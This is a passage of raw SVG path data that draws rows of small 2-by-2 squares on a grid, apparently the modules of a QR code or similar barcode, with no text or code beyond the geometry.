M68,14l2,0 0,2 -2,0 0,-2z M70,14l2,0 0,2 -2,0 0,-2z M72,14l2,0 0,2 -2,0 0,-2z M74,14l2,0 0,2 -2,0 0,-2z M82,14l2,0 0,2 -2,0 0,-2z M84,14l2,0 0,2 -2,0 0,-2z M86,14l2,0 0,2 -2,0 0,-2z M88,14l2,0 0,2 -2,0 0,-2z M90,14l2,0 0,2 -2,0 0,-2z M92,14l2,0 0,2 -2,0 0,-2z M96,14l2,0 0,2 -2,0 0,-2z M102,14l2,0 0,2 -2,0 0,-2z M104,14l2,0 0,2 -2,0 0,-2z M108,14l2,0 0,2 -2,0 0,-2z M110,14l2,0 0,2 -2,0 0,-2z M112,14l2,0 0,2 -2,0 0,-2z M116,14l2,0 0,2 -2,0 0,-2z M122,14l2,0 0,2 -2,0 0,-2z M126,14l2,0 0,2 -2,0 0,-2z M128,14l2,0 0,2 -2,0 0,-2z M132,14l2,0 0,2 -2,0 0,-2z M134,14l2,0 0,2 -2,0 0,-2z M136,14l2,0 0,2 -2,0 0,-2z M144,14l2,0 0,2 -2,0 0,-2z M148,14l2,0 0,2 -2,0 0,-2z M152,14l2,0 0,2 -2,0 0,-2z M154,14l2,0 0,2 -2,0 0,-2z M156,14l2,0 0,2 -2,0 0,-2z M160,14l2,0 0,2 -2,0 0,-2z M8,16l2,0 0,2 -2,0 0,-2z M12,16l2,0 0,2 -2,0 0,-2z M14,16l2,0 0,2 -2,0 0,-2z M16,16l2,0 0,2 -2,0 0,-2z M20,16l2,0 0,2 -2,0 0,-2z M36,16l2,0 0,2 -2,0 0,-2z M40,16l2,0 0,2 -2,0 0,-2z M42,16l2,0 0,2 -2,0 0,-2z M44,16l2,0 0,2 -2,0 0,-2z M46,16l2,0 0,2 -2,0 0,-2z M48,16l2,0 0,2 -2,0 0,-2z M52,16l2,0 0,2 -2,0 0,-2z M56,16l2,0 0,2 -2,0 0,-2z M58,16l2,0 0,2 -2,0 0,-2z M60,16l2,0 0,2 -2,0 0,-2z M62,16l2,0 0,2 -2,0 0,-2z M64,16l2,0 0,2 -2,0 0,-2z M68,16l2,0 0,2 -2,0 0,-2z M76,16l2,0 0,2 -2,0 0,-2z M80,16l2,0 0,2 -2,0 0,-2z M82,16l2,0 0,2 -2,0 0,-2z M92,16l2,0 0,2 -2,0 0,-2z M94,16l2,0 0,2 -2,0 0,-2z M98,16l2,0 0,2 -2,0 0,-2z M100,16l2,0 0,2 -2,0 0,-2z M102,16l2,0 0,2 -2,0 0,-2z M104,16l2,0 0,2 -2,0 0,-2z M106,16l2,0 0,2 -2,0 0,-2z M108,16l2,0 0,2 -2,0 0,-2z M112,16l2,0 0,2 -2,0 0,-2z M126,16l2,0 0,2 -2,0 0,-2z M132,16l2,0 0,2 -2,0 0,-2z M136,16l2,0 0,2 -2,0 0,-2z M140,16l2,0 0,2 -2,0 0,-2z M142,16l2,0 0,2 -2,0 0,-2z M144,16l2,0 0,2 -2,0 0,-2z M148,16l2,0 0,2 -2,0 0,-2z M152,16l2,0 0,2 -2,0 0,-2z M154,16l2,0 0,2 -2,0 0,-2z M156,16l2,0 0,2 -2,0 0,-2z M160,16l2,0 0,2 -2,0 0,-2z M8,18l2,0 0,2 -2,0 0,-2z M20,18l2,0 0,2 -2,0 0,-2z M28,18l2,0 0,2 -2,0 0,-2z M32,18l2,0 0,2 -2,0 0,-2z M38,18l2,0 0,2 -2,0 0,-2z M40,18l2,0 0,2 -2,0 0,-2z M44,18l2,0 0,2 -2,0 0,-2z M56,18l2,0 0,2 -2,0 0,-2z M64,18l2,0 0,2 -2,0 0,-2z M74,18l2,0 0,2 -2,0 0,-2z M78,18l2,0 0,2 -2,0 0,-2z M80,18l2,0 0,2 -2,0 0,-2z M82,18l2,0 0,2 -2,0 0,-2z M84,18l2,0 0,2 -2,0 0,-2z M88,18l2,0 0,2 -2,0 0,-2z M90,18l2,0 0,2 -2,0 0,-2z M92,18l2,0 0,2 -2,0 0,-2z M98,18l2,0 0,2 -2,0 0,-2z M100,18l2,0 0,2 -2,0 0,-2z M108,18l2,0 0,2 -2,0 0,-2z M110,18l2,0 0,2 -2,0 0,-2z M112,18l2,0 0,2 -2,0 0,-2z M116,18l2,0 0,2 -2,0 0,-2z M124,18l2,0 0,2 -2,0 0,-2z M126,18l2,0 0,2 -2,0 0,-2z M134,18l2,0 0,2 -2,0 0,-2z M140,18l2,0 0,2 -2,0 0,-2z M148,18l2,0 0,2 -2,0 0,-2z M160,18l2,0 0,2 -2,0 0,-2z M8,20l2,0 0,2 -2,0 0,-2z M10,20l2,0 0,2 -2,0 0,-2z M12,20l2,0 0,2 -2,0 0,-2z M14,20l2,0 0,2 -2,0 0,-2z M16,20l2,0 0,2 -2,0 0,-2z M18,20l2,0 0,2 -2,0 0,-2z M20,20l2,0 0,2 -2,0 0,-2z M24,20l2,0 0,2 -2,0 0,-2z M28,20l2,0 0,2 -2,0 0,-2z M32,20l2,0 0,2 -2,0 0,-2z M36,20l2,0 0,2 -2,0 0,-2z M40,20l2,0 0,2 -2,0 0,-2z M44,20l2,0 0,2 -2,0 0,-2z M48,20l2,0 0,2 -2,0 0,-2z M52,20l2,0 0,2 -2,0 0,-2z M56,20l2,0 0,2 -2,0 0,-2z M60,20l2,0 0,2 -2,0 0,-2z M64,20l2,0 0,2 -2,0 0,-2z M68,20l2,0 0,2 -2,0 0,-2z M72,20l2,0 0,2 -2,0 0,-2z M76,20l2,0 0,2 -2,0 0,-2z M80,20l2,0 0,2 -2,0 0,-2z M84,20l2,0 0,2 -2,0 0,-2z M88,20l2,0 0,2 -2,0 0,-2z M92,20l2,0 0,2 -2,0 0,-2z M96,20l2,0 0,2 -2,0 0,-2z M100,20l2,0 0,2 -2,0 0,-2z M104,20l2,0 0,2 -2,0 0,-2z M108,20l2,0 0,2 -2,0 0,-2z M112,20l2,0 0,2 -2,0 0,-2z M116,20l2,0 0,2 -2,0 0,-2z M120,20l2,0 0,2 -2,0 0,-2z M124,20l2,0 0,2 -2,0 0,-2z M128,20l2,0 0,2 -2,0 0,-2z M132,20l2,0 0,2 -2,0 0,-2z M136,20l2,0 0,2 -2,0 0,-2z M140,20l2,0 0,2 -2,0 0,-2z M144,20l2,0 0,2 -2,0 0,-2z M148,20l2,0 0,2 -2,0 0,-2z M150,20l2,0 0,2 -2,0 0,-2z M152,20l2,0 0,2 -2,0 0,-2z M154,20l2,0 0,2 -2,0 0,-2z M156,20l2,0 0,2 -2,0 0,-2z M158,20l2,0 0,2 -2,0 0,-2z M160,20l2,0 0,2 -2,0 0,-2z M26,22l2,0 0,2 -2,0 0,-2z M32,22l2,0 0,2 -2,0 0,-2z M36,22l2,0 0,2 -2,0 0,-2z M38,22l2,0 0,2 -2,0 0,-2z M40,22l2,0 0,2 -2,0 0,-2z M50,22l2,0 0,2 -2,0 0,-2z M56,22l2,0 0,2 -2,0 0,-2z M64,22l2,0 0,2 -2,0 0,-2z M76,22l2,0 0,2 -2,0 0,-2z M78,22l2,0 0,2 -2,0 0,-2z M80,22l2,0 0,2 -2,0 0,-2z M86,22l2,0 0,2 -2,0 0,-2z M88,22l2,0 0,2 -2,0 0,-2z M90,22l2,0 0,2 -2,0 0,-2z M98,22l2,0 0,2 -2,0 0,-2z M100,22l2,0 0,2 -2,0 0,-2z M108,22l2,0 0,2 -2,0 0,-2z M114,22l2,0 0,2 -2,0 0,-2z M120,22l2,0 0,2 -2,0 0,-2z M128,22l2,0 0,2 -2,0 0,-2z M130,22l2,0 0,2 -2,0 0,-2z M132,22l2,0 0,2 -2,0 0,-2z M136,22l2,0 0,2 -2,0 0,-2z M144,22l2,0 0,2 -2,0 0,-2z M10,24l2,0 0,2 -2,0 0,-2z M20,24l2,0 0,2 -2,0 0,-2z M22,24l2,0 0,2 -2,0 0,-2z M24,24l2,0 0,2 -2,0 0,-2z M26,24l2,0 0,2 -2,0 0,-2z M30,24l2,0 0,2 -2,0 0,-2z M34,24l2,0 0,2 -2,0 0,-2z M46,24l2,0 0,2 -2,0 0,-2z M48,24l2,0 0,2 -2,0 0,-2z M50,24l2,0 0,2 -2,0 0,-2z M56,24l2,0 0,2 -2,0 0,-2z M58,24l2,0 0,2 -2,0 0,-2z M60,24l2,0 0,2 -2,0 0,-2z M62,24l2,0 0,2 -2,0 0,-2z M64,24l2,0 0,2 -2,0 0,-2z M68,24l2,0 0,2 -2,0 0,-2z M74,24l2,0 0,2 -2,0 0,-2z M82,24l2,0 0,2 -2,0 0,-2z M84,24l2,0 0,2 -2,0 0,-2z M86,24l2,0 0,2 -2,0 0,-2z M88,24l2,0 0,2 -2,0 0,-2z M94,24l2,0 0,2 -2,0 0,-2z M96,24l2,0 0,2 -2,0 0,-2z M100,24l2,0 0,2 -2,0 0,-2z M102,24l2,0 0,2 -2,0 0,-2z M104,24l2,0 0,2 -2,0 0,-2z M106,24l2,0 0,2 -2,0 0,-2z M108,24l2,0 0,2 -2,0 0,-2z M110,24l2,0 0,2 -2,0 0,-2z M112,24l2,0 0,2 -2,0 0,-2z M114,24l2,0 0,2 -2,0 0,-2z M118,24l2,0 0,2 -2,0 0,-2z M122,24l2,0 0,2 -2,0 0,-2z M130,24l2,0 0,2 -2,0 0,-2z M132,24l2,0 0,2 -2,0 0,-2z M140,24l2,0 0,2 -2,0 0,-2z M146,24l2,0 0,2 -2,0 0,-2z M158,24l2,0 0,2 -2,0 0,-2z M160,24l2,0 0,2 -2,0 0,-2z M8,26l2,0 0,2 -2,0 0,-2z M10,26l2,0 0,2 -2,0 0,-2z M14,26l2,0 0,2 -2,0 0,-2z M18,26l2,0 0,2 -2,0 0,-2z M26,26l2,0 0,2 -2,0 0,-2z M30,26l2,0 0,2 -2,0 0,-2z M42,26l2,0 0,2 -2,0 0,-2z M64,26l2,0 0,2 -2,0 0,-2z M68,26l2,0 0,2 -2,0 0,-2z M70,26l2,0 0,2 -2,0 0,-2z M72,26l2,0 0,2 -2,0 0,-2z M76,26l2,0 0,2 -2,0 0,-2z M80,26l2,0 0,2 -2,0 0,-2z M84,26l2,0 0,2 -2,0 0,-2z M90,26l2,0 0,2 -2,0 0,-2z M98,26l2,0 0,2 -2,0 0,-2z M100,26l2,0 0,2 -2,0 0,-2z M108,26l2,0 0,2 -2,0 0,-2z M112,26l2,0 0,2 -2,0 0,-2z M114,26l2,0 0,2 -2,0 0,-2z M116,26l2,0 0,2 -2,0 0,-2z M118,26l2,0 0,2 -2,0 0,-2z M128,26l2,0 0,2 -2,0 0,-2z M130,26l2,0 0,2 -2,0 0,-2z M132,26l2,0 0,2 -2,0 0,-2z M134,26l2,0 0,2 -2,0 0,-2z M150,26l2,0 0,2 -2,0 0,-2z M154,26l2,0 0,2 -2,0 0,-2z M160,26l2,0 0,2 -2,0 0,-2z M12,28l2,0 0,2 -2,0 0,-2z M14,28l2,0 0,2 -2,0 0,-2z M18,28l2,0 0,2 -2,0 0,-2z M20,28l2,0 0,2 -2,0 0,-2z M22,28l2,0 0,2 -2,0 0,-2z M26,28l2,0 0,2 -2,0 0,-2z M30,28l2,0 0,2 -2,0 0,-2z M34,28l2,0 0,2 -2,0 0,-2z M40,28l2,0 0,2 -2,0 0,-2z M44,28l2,0 0,2 -2,0 0,-2z M48,28l2,0 0,2 -2,0 0,-2z M50,28l2,0 0,2 -2,0 0,-2z M54,28l2,0 0,2 -2,0 0,-2z M56,28l2,0 0,2 -2,0 0,-2z M60,28l2,0 0,2 -2,0 0,-2z M62,28l2,0 0,2 -2,0 0,-2z M64,28l2,0 0,2 -2,0 0,-2z M72,28l2,0 0,2 -2,0 0,-2z M74,28l2,0 0,2 -2,0 0,-2z M78,28l2,0 0,2 -2,0 0,-2z M80,28l2,0 0,2 -2,0 0,-2z M84,28l2,0 0,2 -2,0 0,-2z M86,28l2,0 0,2 -2,0 0,-2z M92,28l2,0 0,2 -2,0 0,-2z M94,28l2,0 0,2 -2,0 0,-2z M96,28l2,0 0,2 -2,0 0,-2z M98,28l2,0 0,2 -2,0 0,-2z M100,28l2,0 0,2 -2,0 0,-2z M102,28l2,0 0,2 -2,0 0,-2z M104,28l2,0 0,2 -2,0 0,-2z M106,28l2,0 0,2 -2,0 0,-2z M110,28l2,0 0,2 -2,0 0,-2z M118,28l2,0 0,2 -2,0 0,-2z M120,28l2,0 0,2 -2,0 0,-2z M122,28l2,0 0,2 -2,0 0,-2z M132,28l2,0 0,2 -2,0 0,-2z M140,28l2,0 0,2 -2,0 0,-2z M148,28l2,0 0,2 -2,0 0,-2z M150,28l2,0 0,2 -2,0 0,-2z M152,28l2,0 0,2 -2,0 0,-2z M156,28l2,0 0,2 -2,0 0,-2z M160,28l2,0 0,2 -2,0 0,-2z M12,30l2,0 0,2 -2,0 0,-2z M14,30l2,0 0,2 -2,0 0,-2z M22,30l2,0 0,2 -2,0 0,-2z M26,30l2,0 0,2 -2,0 0,-2z M32,30l2,0 0,2 -2,0 0,-2z M34,30l2,0 0,2 -2,0 0,-2z M36,30l2,0 0,2 -2,0 0,-2z M38,30l2,0 0,2 -2,0 0,-2z M44,30l2,0 0,2 -2,0 0,-2z M54,30l2,0 0,2 -2,0 0,-2z M58,30l2,0 0,2 -2,0 0,-2z M60,30l2,0 0,2 -2,0 0,-2z M62,30l2,0 0,2 -2,0 0,-2z M64,30l2,0 0,2 -2,0 0,-2z M66,30l2,0 0,2 -2,0 0,-2z M68,30l2,0 0,2 -2,0 0,-2z M70,30l2,0 0,2 -2,0 0,-2z M72,30l2,0 0,2 -2,0 0,-2z M76,30l2,0 0,2 -2,0 0,-2z M78,30l2,0 0,2 -2,0 0,-2z M80,30l2,0 0,2 -2,0 0,-2z M82,30l2,0 0,2 -2,0 0,-2z M86,30l2,0 0,2 -2,0 0,-2z M88,30l2,0 0,2 -2,0 0,-2z M92,30l2,0 0,2 -2,0 0,-2z M94,30l2,0 0,2 -2,0 0,-2z M102,30l2,0 0,2 -2,0 0,-2z M106,30l2,0 0,2 -2,0 0,-2z M112,30l2,0 0,2 -2,0 0,-2z M116,30l2,0 0,2 -2,0 0,-2z M122,30l2,0 0,2 -2,0 0,-2z M124,30l2,0 0,2 -2,0 0,-2z M128,30l2,0 0,2 -2,0 0,-2z M136,30l2,0 0,2 -2,0 0,-2z M138,30l2,0 0,2 -2,0 0,-2z M144,30l2,0 0,2 -2,0 0,-2z M152,30l2,0 0,2 -2,0 0,-2z M154,30l2,0 0,2 -2,0 0,-2z M156,30l2,0 0,2 -2,0 0,-2z M160,30l2,0 0,2 -2,0 0,-2z M10,32l2,0 0,2 -2,0 0,-2z M20,32l2,0 0,2 -2,0 0,-2z M22,32l2,0 0,2 -2,0 0,-2z M24,32l2,0 0,2 -2,0 0,-2z M26,32l2,0 0,2 -2,0 0,-2z M28,32l2,0 0,2 -2,0 0,-2z M34,32l2,0 0,2 -2,0 0,-2z M36,32l2,0 0,2 -2,0 0,-2z M38,32l2,0 0,2 -2,0 0,-2z M48,32l2,0 0,2 -2,0 0,-2z M50,32l2,0 0,2 -2,0 0,-2z M52,32l2,0 0,2 -2,0 0,-2z M58,32l2,0 0,2 -2,0 0,-2z M60,32l2,0 0,2 -2,0 0,-2z M64,32l2,0 0,2 -2,0 0,-2z M66,32l2,0 0,2 -2,0 0,-2z M72,32l2,0 0,2 -2,0 0,-2z M74,32l2,0 0,2 -2,0 0,-2z M76,32l2,0 0,2 -2,0 0,-2z M78,32l2,0 0,2 -2,0 0,-2z M82,32l2,0 0,2 -2,0 0,-2z M84,32l2,0 0,2 -2,0 0,-2z M88,32l2,0 0,2 -2,0 0,-2z M92,32l2,0 0,2 -2,0 0,-2z M94,32l2,0 0,2 -2,0 0,-2z M96,32l2,0 0,2 -2,0 0,-2z M98,32l2,0 0,2 -2,0 0,-2z M100,32l2,0 0,2 -2,0 0,-2z M104,32l2,0 0,2 -2,0 0,-2z M106,32l2,0 0,2 -2,0 0,-2z M108,32l2,0 0,2 -2,0 0,-2z M112,32l2,0 0,2 -2,0 0,-2z M114,32l2,0 0,2 -2,0 0,-2z M118,32l2,0 0,2 -2,0 0,-2z M126,32l2,0 0,2 -2,0 0,-2z M130,32l2,0 0,2 -2,0 0,-2z M132,32l2,0 0,2 -2,0 0,-2z M136,32l2,0 0,2 -2,0 0,-2z M142,32l2,0 0,2 -2,0 0,-2z M144,32l2,0 0,2 -2,0 0,-2z M148,32l2,0 0,2 -2,0 0,-2z M152,32l2,0 0,2 -2,0 0,-2z M154,32l2,0 0,2 -2,0 0,-2z M156,32l2,0 0,2 -2,0 0,-2z M10,34l2,0 0,2 -2,0 0,-2z M12,34l2,0 0,2 -2,0 0,-2z M22,34l2,0 0,2 -2,0 0,-2z M24,34l2,0 0,2 -2,0 0,-2z M26,34l2,0 0,2 -2,0 0,-2z M28,34l2,0 0,2 -2,0 0,-2z M34,34l2,0 0,2 -2,0 0,-2z M36,34l2,0 0,2 -2,0 0,-2z M38,34l2,0 0,2 -2,0 0,-2z M40,34l2,0 0,2 -2,0 0,-2z M42,34l2,0 0,2 -2,0 0,-2z M44,34l2,0 0,2 -2,0 0,-2z M46,34l2,0 0,2 -2,0 0,-2z M48,34l2,0 0,2 -2,0 0,-2z M50,34l2,0 0,2 -2,0 0,-2z M52,34l2,0 0,2 -2,0 0,-2z M54,34l2,0 0,2 -2,0 0,-2z M58,34l2,0 0,2 -2,0 0,-2z M68,34l2,0 0,2 -2,0 0,-2z M70,34l2,0 0,2 -2,0 0,-2z M72,34l2,0 0,2 -2,0 0,-2z M80,34l2,0 0,2 -2,0 0,-2z M84,34l2,0 0,2 -2,0 0,-2z M86,34l2,0 0,2 -2,0 0,-2z M92,34l2,0 0,2 -2,0 0,-2z M94,34l2,0 0,2 -2,0 0,-2z M100,34l2,0 0,2 -2,0 0,-2z M102,34l2,0 0,2 -2,0 0,-2z M110,34l2,0 0,2 -2,0 0,-2z M112,34l2,0 0,2 -2,0 0,-2z M116,34l2,0 0,2 -2,0 0,-2z M122,34l2,0 0,2 -2,0 0,-2z M128,34l2,0 0,2 -2,0 0,-2z M132,34l2,0 0,2 -2,0 0,-2z M134,34l2,0 0,2 -2,0 0,-2z M136,34l2,0 0,2 -2,0 0,-2z M138,34l2,0 0,2 -2,0 0,-2z M140,34l2,0 0,2 -2,0 0,-2z M144,34l2,0 0,2 -2,0 0,-2z M152,34l2,0 0,2 -2,0 0,-2z M10,36l2,0 0,2 -2,0 0,-2z M12,36l2,0 0,2 -2,0 0,-2z M14,36l2,0 0,2 -2,0 0,-2z M16,36l2,0 0,2 -2,0 0,-2z M20,36l2,0 0,2 -2,0 0,-2z M26,36l2,0 0,2 -2,0 0,-2z M32,36l2,0 0,2 -2,0 0,-2z M36,36l2,0 0,2 -2,0 0,-2z M40,36l2,0 0,2 -2,0 0,-2z M44,36l2,0 0,2 -2,0 0,-2z M50,36l2,0 0,2 -2,0 0,-2z M54,36l2,0 0,2 -2,0 0,-2z M56,36l2,0 0,2 -2,0 0,-2z M58,36l2,0 0,2 -2,0 0,-2z M60,36l2,0 0,2 -2,0 0,-2z M64,36l2,0 0,2 -2,0 0,-2z M68,36l2,0 0,2 -2,0 0,-2z M74,36l2,0 0,2 -2,0 0,-2z M78,36l2,0 0,2 -2,0 0,-2z M80,36l2,0 0,2 -2,0 0,-2z M82,36l2,0 0,2 -2,0 0,-2z M86,36l2,0 0,2 -2,0 0,-2z M88,36l2,0 0,2 -2,0 0,-2z M90,36l2,0 0,2 -2,0 0,-2z M92,36l2,0 0,2 -2,0 0,-2z M98,36l2,0 0,2 -2,0 0,-2z M106,36l2,0 0,2 -2,0 0,-2z M108,36l2,0 0,2 -2,0 0,-2z M112,36l2,0 0,2 -2,0 0,-2z M114,36l2,0 0,2 -2,0 0,-2z M122,36l2,0 0,2 -2,0 0,-2z M124,36l2,0 0,2 -2,0 0,-2z M136,36l2,0 0,2 -2,0 0,-2z M152,36l2,0 0,2 -2,0 0,-2z M154,36l2,0 0,2 -2,0 0,-2z M160,36l2,0 0,2 -2,0 0,-2z M26,38l2,0 0,2 -2,0 0,-2z M28,38l2,0 0,2 -2,0 0,-2z M32,38l2,0 0,2 -2,0 0,-2z M34,38l2,0 0,2 -2,0 0,-2z M36,38l2,0 0,2 -2,0 0,-2z M38,38l2,0 0,2 -2,0 0,-2z M44,38l2,0 0,2 -2,0 0,-2z M48,38l2,0 0,2 -2,0 0,-2z M50,38l2,0 0,2 -2,0 0,-2z M52,38l2,0 0,2 -2,0 0,-2z M54,38l2,0 0,2 -2,0 0,-2z M60,38l2,0 0,2 -2,0 0,-2z M72,38l2,0 0,2 -2,0 0,-2z M78,38l2,0 0,2 -2,0 0,-2z M80,38l2,0 0,2 -2,0 0,-2z M84,38l2,0 0,2 -2,0 0,-2z M86,38l2,0 0,2 -2,0 0,-2z M92,38l2,0 0,2 -2,0 0,-2z M96,38l2,0 0,2 -2,0 0,-2z M98,38l2,0 0,2 -2,0 0,-2z M106,38l2,0 0,2 -2,0 0,-2z M112,38l2,0 0,2 -2,0 0,-2z M116,38l2,0 0,2 -2,0 0,-2z M124,38l2,0 0,2 -2,0 0,-2z M128,38l2,0 0,2 -2,0 0,-2z M130,38l2,0 0,2 -2,0 0,-2z M134,38l2,0 0,2 -2,0 0,-2z M136,38l2,0 0,2 -2,0 0,-2z M140,38l2,0 0,2 -2,0 0,-2z M144,38l2,0 0,2 -2,0 0,-2z M146,38l2,0 0,2 -2,0 0,-2z M150,38l2,0 0,2 -2,0 0,-2z M156,38l2,0 0,2 -2,0 0,-2z M10,40l2,0 0,2 -2,0 0,-2z M18,40l2,0 0,2 -2,0 0,-2z M20,40l2,0 0,2 -2,0 0,-2z M22,40l2,0 0,2 -2,0 0,-2z M24,40l2,0 0,2 -2,0 0,-2z M26,40l2,0 0,2 -2,0 0,-2z M30,40l2,0 0,2 -2,0 0,-2z M34,40l2,0 0,2 -2,0 0,-2z M36,40l2,0 0,2 -2,0 0,-2z M44,40l2,0 0,2 -2,0 0,-2z M46,40l2,0 0,2 -2,0 0,-2z M48,40l2,0 0,2 -2,0 0,-2z M50,40l2,0 0,2 -2,0 0,-2z M54,40l2,0 0,2 -2,0 0,-2z M60,40l2,0 0,2 -2,0 0,-2z M62,40l2,0 0,2 -2,0 0,-2z M66,40l2,0 0,2 -2,0 0,-2z M68,40l2,0 0,2 -2,0 0,-2z M72,40l2,0 0,2 -2,0 0,-2z M74,40l2,0 0,2 -2,0 0,-2z M86,40l2,0 0,2 -2,0 0,-2z M88,40l2,0 0,2 -2,0 0,-2z M94,40l2,0 0,2 -2,0 0,-2z M96,40l2,0 0,2 -2,0 0,-2z M100,40l2,0 0,2 -2,0 0,-2z M102,40l2,0 0,2 -2,0 0,-2z M104,40l2,0 0,2 -2,0 0,-2z M106,40l2,0 0,2 -2,0 0,-2z M108,40l2,0 0,2 -2,0 0,-2z M110,40l2,0 0,2 -2,0 0,-2z M112,40l2,0 0,2 -2,0 0,-2z M118,40l2,0 0,2 -2,0 0,-2z M122,40l2,0 0,2 -2,0 0,-2z M130,40l2,0 0,2 -2,0 0,-2z M132,40l2,0 0,2 -2,0 0,-2z M134,40l2,0 0,2 -2,0 0,-2z M136,40l2,0 0,2 -2,0 0,-2z M140,40l2,0 0,2 -2,0 0,-2z M142,40l2,0 0,2 -2,0 0,-2z M144,40l2,0 0,2 -2,0 0,-2z M146,40l2,0 0,2 -2,0 0,-2z M148,40l2,0 0,2 -2,0 0,-2z M154,40l2,0 0,2 -2,0 0,-2z M160,40l2,0 0,2 -2,0 0,-2z M12,42l2,0 0,2 -2,0 0,-2z M14,42l2,0 0,2 -2,0 0,-2z M16,42l2,0 0,2 -2,0 0,-2z M18,42l2,0 0,2 -2,0 0,-2z M24,42l2,0 0,2 -2,0 0,-2z M26,42l2,0 0,2 -2,0 0,-2z M28,42l2,0 0,2 -2,0 0,-2z M30,42l2,0 0,2 -2,0 0,-2z M34,42l2,0 0,2 -2,0 0,-2z M36,42l2,0 0,2 -2,0 0,-2z M40,42l2,0 0,2 -2,0 0,-2z M52,42l2,0 0,2 -2,0 0,-2z M54,42l2,0 0,2 -2,0 0,-2z M58,42l2,0 0,2 -2,0 0,-2z M66,42l2,0 0,2 -2,0 0,-2z M68,42l2,0 0,2 -2,0 0,-2z M70,42l2,0 0,2 -2,0 0,-2z M80,42l2,0 0,2 -2,0 0,-2z M84,42l2,0 0,2 -2,0 0,-2z M88,42l2,0 0,2 -2,0 0,-2z M90,42l2,0 0,2 -2,0 0,-2z M96,42l2,0 0,2 -2,0 0,-2z M98,42l2,0 0,2 -2,0 0,-2z M102,42l2,0 0,2 -2,0 0,-2z M106,42l2,0 0,2 -2,0 0,-2z M116,42l2,0 0,2 -2,0 0,-2z M118,42l2,0 0,2 -2,0 0,-2z M120,42l2,0 0,2 -2,0 0,-2z M124,42l2,0 0,2 -2,0 0,-2z M128,42l2,0 0,2 -2,0 0,-2z M130,42l2,0 0,2 -2,0 0,-2z M134,42l2,0 0,2 -2,0 0,-2z M136,42l2,0 0,2 -2,0 0,-2z M144,42l2,0 0,2 -2,0 0,-2z M146,42l2,0 0,2 -2,0 0,-2z M150,42l2,0 0,2 -2,0 0,-2z M154,42l2,0 0,2 -2,0 0,-2z M156,42l2,0 0,2 -2,0 0,-2z M8,44l2,0 0,2 -2,0 0,-2z M14,44l2,0 0,2 -2,0 0,-2z M16,44l2,0 0,2 -2,0 0,-2z M20,44l2,0 0,2 -2,0 0,-2z M24,44l2,0 0,2 -2,0 0,-2z M28,44l2,0 0,2 -2,0 0,-2z M34,44l2,0 0,2 -2,0 0,-2z M44,44l2,0 0,2 -2,0 0,-2z M48,44l2,0 0,2 -2,0 0,-2z M50,44l2,0 0,2 -2,0 0,-2z M52,44l2,0 0,2 -2,0 0,-2z M56,44l2,0 0,2 -2,0 0,-2z M62,44l2,0 0,2 -2,0 0,-2z M68,44l2,0 0,2 -2,0 0,-2z M72,44l2,0 0,2 -2,0 0,-2z M74,44l2,0 0,2 -2,0 0,-2z M76,44l2,0 0,2 -2,0 0,-2z M80,44l2,0 0,2 -2,0 0,-2z M84,44l2,0 0,2 -2,0 0,-2z M86,44l2,0 0,2 -2,0 0,-2z M88,44l2,0 0,2 -2,0 0,-2z M98,44l2,0 0,2 -2,0 0,-2z M102,44l2,0 0,2 -2,0 0,-2z M106,44l2,0 0,2 -2,0 0,-2z M110,44l2,0 0,2 -2,0 0,-2z M112,44l2,0 0,2 -2,0 0,-2z M120,44l2,0 0,2 -2,0 0,-2z M122,44l2,0 0,2 -2,0 0,-2z M124,44l2,0 0,2 -2,0 0,-2z M126,44l2,0 0,2 -2,0 0,-2z M130,44l2,0 0,2 -2,0 0,-2z M136,44l2,0 0,2 -2,0 0,-2z M138,44l2,0 0,2 -2,0 0,-2z M140,44l2,0 0,2 -2,0 0,-2z M142,44l2,0 0,2 -2,0 0,-2z M144,44l2,0 0,2 -2,0 0,-2z M148,44l2,0 0,2 -2,0 0,-2z M152,44l2,0 0,2 -2,0 0,-2z M154,44l2,0 0,2 -2,0 0,-2z M8,46l2,0 0,2 -2,0 0,-2z M12,46l2,0 0,2 -2,0 0,-2z M14,46l2,0 0,2 -2,0 0,-2z M22,46l2,0 0,2 -2,0 0,-2z M28,46l2,0 0,2 -2,0 0,-2z M32,46l2,0 0,2 -2,0 0,-2z M34,46l2,0 0,2 -2,0 0,-2z M38,46l2,0 0,2 -2,0 0,-2z M44,46l2,0 0,2 -2,0 0,-2z M46,46l2,0 0,2 -2,0 0,-2z M54,46l2,0 0,2 -2,0 0,-2z M62,46l2,0 0,2 -2,0 0,-2z M64,46l2,0 0,2 -2,0 0,-2z M66,46l2,0 0,2 -2,0 0,-2z M68,46l2,0 0,2 -2,0 0,-2z M70,46l2,0 0,2 -2,0 0,-2z M72,46l2,0 0,2 -2,0 0,-2z M74,46l2,0 0,2 -2,0 0,-2z M78,46l2,0 0,2 -2,0 0,-2z M80,46l2,0 0,2 -2,0 0,-2z M86,46l2,0 0,2 -2,0 0,-2z M88,46l2,0 0,2 -2,0 0,-2z M90,46l2,0 0,2 -2,0 0,-2z M94,46l2,0 0,2 -2,0 0,-2z M102,46l2,0 0,2 -2,0 0,-2z M104,46l2,0 0,2 -2,0 0,-2z M106,46l2,0 0,2 -2,0 0,-2z M112,46l2,0 0,2 -2,0 0,-2z M116,46l2,0 0,2 -2,0 0,-2z M120,46l2,0 0,2 -2,0 0,-2z M124,46l2,0 0,2 -2,0 0,-2z M128,46l2,0 0,2 -2,0 0,-2z M134,46l2,0 0,2 -2,0 0,-2z M138,46l2,0 0,2 -2,0 0,-2z M144,46l2,0 0,2 -2,0 0,-2z M148,46l2,0 0,2 -2,0 0,-2z M152,46l2,0 0,2 -2,0 0,-2z M154,46l2,0 0,2 -2,0 0,-2z M156,46l2,0 0,2 -2,0 0,-2z M160,46l2,0 0,2 -2,0 0,-2z M10,48l2,0 0,2 -2,0 0,-2z M12,48l2,0 0,2 -2,0 0,-2z M16,48l2,0 0,2 -2,0 0,-2z M18,48l2,0 0,2 -2,0 0,-2z M20,48l2,0 0,2 -2,0 0,-2z M26,48l2,0 0,2 -2,0 0,-2z M28,48l2,0 0,2 -2,0 0,-2z M30,48l2,0 0,2 -2,0 0,-2z M34,48l2,0 0,2 -2,0 0,-2z M36,48l2,0 0,2 -2,0 0,-2z M38,48l2,0 0,2 -2,0 0,-2z M40,48l2,0 0,2 -2,0 0,-2z M46,48l2,0 0,2 -2,0 0,-2z M48,48l2,0 0,2 -2,0 0,-2z M50,48l2,0 0,2 -2,0 0,-2z M54,48l2,0 0,2 -2,0 0,-2z M60,48l2,0 0,2 -2,0 0,-2z M70,48l2,0 0,2 -2,0 0,-2z M74,48l2,0 0,2 -2,0 0,-2z M92,48l2,0 0,2 -2,0 0,-2z 